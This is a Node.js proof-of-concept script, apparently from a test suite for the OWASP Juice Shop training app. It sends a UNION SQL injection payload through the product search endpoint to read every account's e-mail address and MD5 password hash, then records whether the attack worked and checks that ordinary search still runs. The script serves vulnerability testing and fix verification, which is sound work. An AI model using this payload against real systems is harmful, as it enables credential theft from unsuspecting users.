#!/usr/bin/env node
/*
 * V2 - UNION SQL Injection leaking the whole Users table (CWE-89, A03:2021)
 *
 * routes/search.ts interpolated the search term straight into the statement:
 *
 *   SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR ... ))
 *
 * Closing the bracket and appending a UNION SELECT lets an unauthenticated
 * caller read any table - here the e-mail addresses and MD5 password hashes of
 * every account, which are rendered through the normal product JSON.
 *
 * Run:  node poc/02-union-sqli-exfiltration.mjs --url http://localhost:3000
 */

import { ARGS, request, verdict } from './lib/util.mjs'

const PAYLOAD = "')) UNION SELECT id, email, password, role, '', '', '', '', '' FROM Users--"

console.log(`\n[*] Target            : ${ARGS.url}`)
console.log(`[*] UNION payload     : q = ${PAYLOAD}`)

const res = await request(`/rest/products/search?q=${encodeURIComponent(PAYLOAD)}`)

const evidence = []
evidence.push(`GET /rest/products/search -> HTTP ${res.status}`)

if (res.status !== 200) {
  evidence.push(`Response: ${res.text.slice(0, 160)}`)
  // Control: ordinary product search must still work - the fix must not break
  // the feature, only the injection.
  const control = await request('/rest/products/search?q=apple')
  evidence.push(`Control: /rest/products/search?q=apple -> HTTP ${control.status}, ${control.json?.data?.length ?? 0} products (search still works)`)
  verdict({
    id: 'V2',
    title: 'UNION SQL Injection - credential exfiltration',
    cwe: 'CWE-89',
    exploited: false,
    evidence
  })
}

const rows = res.json?.data ?? []
const emails = rows.filter(r => /@juice-sh\.op$/.test(String(r.name ?? '')))
const hashes = rows.filter(r => /^[0-9a-f]{32}$/.test(String(r.description ?? '')))

evidence.push(`Rows returned          : ${rows.length}`)
evidence.push(`E-mail addresses read  : ${emails.length}`)
evidence.push(`MD5 password hashes    : ${hashes.length}`)
for (const row of emails.slice(0, 4)) {
  evidence.push(`   - ${row.name} : ${row.description}  (role ${row.price})`)
}
if (emails.length > 4) evidence.push(`   ... ${emails.length - 4} more`)

const exploited = emails.length > 0 && hashes.length > 0

// Control: an ordinary search term must keep working.
const control = await request('/rest/products/search?q=apple')
evidence.push(`Control: /rest/products/search?q=apple -> HTTP ${control.status}, ${control.json?.data?.length ?? 0} products`)

verdict({
  id: 'V2',
  title: 'UNION SQL Injection - credential exfiltration',
  cwe: 'CWE-89',
  exploited,
  evidence
})
